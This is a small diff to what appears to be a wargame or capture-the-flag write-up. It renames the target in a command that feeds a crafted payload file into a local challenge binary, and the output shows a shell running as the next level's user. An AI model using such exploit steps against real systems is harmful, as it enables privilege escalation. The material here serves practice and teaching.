@@ -426,10 +426,11 @@ with open("payload.txt", "wb") as f:
 print("Payload written with offset %d" % offset)
 ```
 ```
-(cat payload.txt; cat) | ./binary
+(cat payload.txt; cat) | ./level5
 
 whoami
 level6
 ```
+
 
 
